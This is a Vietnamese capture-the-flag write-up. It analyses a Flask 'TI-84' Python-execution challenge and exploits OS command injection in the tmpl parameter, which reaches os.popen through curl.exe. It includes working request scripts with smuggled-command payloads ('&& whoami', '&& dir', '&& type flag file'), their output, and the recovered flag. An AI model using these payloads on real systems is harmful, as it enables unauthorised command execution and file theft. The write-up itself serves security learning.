![image](https://github.com/user-attachments/assets/6f7b63e8-318c-4e55-bb9f-c0dddc93ab81)

# **ANALYZE**

Theo như mô tả , thì trang web này được code bởi 1 dev ko quá tốt , nên sẽ để lại 1 số lỗi ko đáng có.

Trước hết , tôi sẽ đi test các chức năng có trên trang web như 1 người dùng bình thường
Và tôi thấy nó là 1 dạng để chúng ta nhập code python vào rồi thực thi cho ta
Tôi sẽ thử với câu lệnh python đơn giản `print("he he he") `
![image](https://github.com/user-attachments/assets/8d91fcdc-5b05-453f-9a5b-83bc95b964b4)


Bây giờ chúng ta sẽ cùng đi phân tích source code mà chall đã cấp cho chúng ta.

ở trong tệp đầu tiên là `code_tmpl.py`
```
from RestrictedPython import compile_restricted
code = """
{{code}}
"""

byte_code = compile_restricted(code, '<inline>', 'eval')

print(eval(byte_code, {'__builtins__': {}}, {'__builtins__': {}}))

```
from RestrictedPython import compile_restricted
→ Import hàm compile_restricted để biên dịch mã Python trong môi trường bị giới hạn (sandbox).

code = """{{code}}"""
→ Khai báo chuỗi chứa mã Python cần thực thi. {{code}} là placeholder để chèn mã động.

byte_code = compile_restricted(code, '<inline>', 'eval')
→ Biên dịch chuỗi code thành bytecode an toàn.
→ 'eval' chỉ định đây là biểu thức, không phải toàn bộ chương trình.
→ '<inline>' là tên giả lập file dùng khi báo lỗi.

print(eval(byte_code, {'__builtins__': {}}, {'__builtins__': {}}))
→ Thực thi bytecode bằng eval trong môi trường không có hàm dựng sẵn.
→ Cả globals và locals đều được truyền __builtins__ rỗng để giới hạn tuyệt đối quyền truy cập.

Tiếp theo là file `server.py`
file này được sử dụng framework flask để code trang web python.

```
from flask import Flask, request, send_file
import subprocess
import tempfile
import os
app = Flask(__name__, static_folder=None)
code_tmpl = open("code_tmpl.py").read()
```
Import các thư viện cần thiết: Flask, subprocess, os.

Khởi tạo Flask app và đọc nội dung file code_tmpl.py – đây là đoạn mã chứa khung Python để nhúng code người dùng.



Route / – Trả Về Giao Diện Chính
```
@app.route('/')
def index():
    return open("static/index.html", "rb").read().decode()
```
Trả về nội dung HTML từ file index.html trong thư mục static.


Route /static – Phục Vụ File Template
```
@app.route('/static')
def fileserve():
    url = request.url
    fpath = url.split(f"static?")[-1]
    files = os.listdir("static")
    if fpath not in files or not fpath.endswith(".tmpl"):
        fpath = "🐈.tmpl"
    return send_file(f"static/{fpath}")

```
Tách tên file .tmpl từ URL (không dùng request.args, dễ bị lỗi).

Kiểm tra file tồn tại và có đuôi .tmpl.

Nếu không hợp lệ, fallback sang 🐈.tmpl.



Hàm render_error – Xử Lý Lỗi
```
def render_error(msg):
    return open("static/error.html", "rb").read().decode().replace("{{msg}}", msg)
```
Trả về giao diện lỗi với thông điệp được chèn vào HTML.


Route /ti-84 – Xử Lý Thực Thi Code
```
@app.route('/ti-84')
def execute_code():
    code = request.values.get('code')
    output_tmpl = request.values.get('tmpl')

```
Nhận input: code (mã Python), tmpl (tên template để hiển thị kết quả).
```
    if len(code) > 3 and any(c in code for c in "0123456789+*-/"):
        return render_error("This is a ~~Wendys~~ TI-84.")
```

Ghi Code vào File Tạm
```
    tmpl = code_tmpl
    tmplcode = tmpl.replace("{{code}}", code)
    tmpfile = tempfile.NamedTemporaryFile(suffix=".py", delete=False)
    tmpfile.write(tmplcode.encode())
    tmpfile.flush()
```
Chèn đoạn code vào template Python.

Tạo file .py tạm thời để chuẩn bị thực thi.


Tạo URL Template và Kiểm Tra Emoji
```
    url = f"{request.url_root}/static?{output_tmpl}.tmpl"
    if sum(1 for c in url if ord(c) > 127) > 1:
        return render_error("too many emojis... chill with the brainrot")
```
Tạo URL để lấy nội dung template qua HTTP.

Giới hạn số lượng ký tự Unicode nhằm tránh spam emoji.


Và điều quan trọng và là mấu chốt của bài bây giờ mới xuất hiện : 
```
    out_tmpl = os.popen(f"curl.exe -s {url}").read()
```
Ông dev này đã dùng os.popen() để gọi curl.exe từ dòng lệnh.

Và đầu vào outphut_tml chính là 1 nơi thích hợp để cho ta có thể truyền untrusted data vào.



# **EXPLOIT**

Chúng ta cùng bắt tay vào tìm cách để có thể khai thác được trang web này , 
ta sẽ xác định trước 1 số thông tin : 
```
Mục tiêu là tìm và đọc được file flag.txt thông qua lỗ hổng OS Command Injection ở endpoint /ti-84.
Và nơi chúng ta chèn payload chính là tham số ?tmpl=
```

Tôi sẽ thử với 1 payload đơn giản trước 

Tôi sẽ sử dụng thư viện requests để gửi 1 cái request tới trang web và mang theo payload của mình tới trang web

```
import requests

url = "https://misc-ti-1983-cwhvdsj2.windows.smiley.cat/ti-84"
payload = {
    "code": "1+1",
    "tmpl": "🐈.tmpl && whoami && echo"
}
r = requests.get(url, params=payload)
print(r.text)
```
Sau khi đoạn Os command được tôi gửi đi thì nó sẽ được đưa vào dòng này để thực thi 
```
    out_tmpl = os.popen(f"curl.exe -s {url}").read()
```
```
curl.exe -s http://host/static?🐈.tmpl && whoami && echo
```
![image](https://github.com/user-attachments/assets/e8ac6e25-0131-4b9f-8af8-0fa8f2a4ebc7)

486bd0acb945\chall: là kết quả của lệnh whoami, cho biết tên người dùng của hệ thống máy chủ đang chạy ứng dụng.

Và còn có thể kết luận thêm là hệ điều hành mà web sử dụng là window do sử dụng `\` thay vì `/` như ơ linux

tmpl: là kết quả của echo hoặc phần còn lại của shell command.

Bước tiếp theo , ta sẽ phải tìm xem flag nằm trong thư mục nào 

Như đoạn script ở trên , ta sẽ sửa lại 1 chút ở payload : 
```
payload = {
    "code": "1+1",
    "tmpl": "🐈.tmpl && dir && echo"
}
```
Và chắc chắn sẽ có người thắc mắc , tại sao ko sử dụng lệnh `ls` mà lại đi dùng `dir`

Câu trả lời too ez , Hệ điều hành mà trang web sủ dụng chính là window , ko phải linux

```
 Volume in drive C has no label.
 Volume Serial Number is 2C73-C453

 Directory of C:\app

06/14/2025  04:41 AM    <DIR>          .
06/14/2025  04:29 AM               208 code_tmpl.py
06/04/2025  05:42 AM         3,730,024 curl.exe
06/14/2025  04:29 AM              (33) flag_4dfa54cf005d9fea.txt
06/12/2025  06:47 AM                23 requirements.txt
06/14/2025  04:29 AM             1,927 server.py
06/14/2025  04:41 AM    <DIR>          static
               5 File(s)      3,732,215 bytes
               2 Dir(s)  136,177,086,464 bytes free
tmpl
```

Để đọc được flag thì ta sẽ tiếp tục sửa lại biến payload : 

và bình thường ở trên linux , chúng ta thường dùng `cat` để đọc file , 

Nhưng bài này là ơ window , và tất nhiên window cũng sẽ có lệnh đọc file riêng của nó

Window sử dụng lệnh `type `
```
payload = {
    "code": "1+1",
    "tmpl": "🐈.tmpl && type flag_4dfa54cf005d9fea.txt && echo"
}
```
![image](https://github.com/user-attachments/assets/894fef68-d242-4af2-989a-37d2aaa5ae4d)


# **FLAG**
```
.;,;.{command_injection_in_2025?}
```
